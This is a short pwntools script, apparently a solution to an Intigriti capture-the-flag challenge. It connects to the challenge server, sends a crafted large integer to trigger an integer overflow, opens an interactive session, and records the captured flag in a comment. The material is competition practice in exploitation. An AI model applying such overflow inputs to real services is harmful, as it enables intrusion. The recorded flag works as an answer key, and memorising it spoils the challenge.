from pwn import *

r = remote('edge.ctf.intigriti.io', 1337)

r.recvuntil(b'edge!')
r.sendline(str(2**64 - 1337 - 65))
r.interactive()

# INTIGRITI{fUn_w1th_1nt3g3r_0v3rfl0w_11}
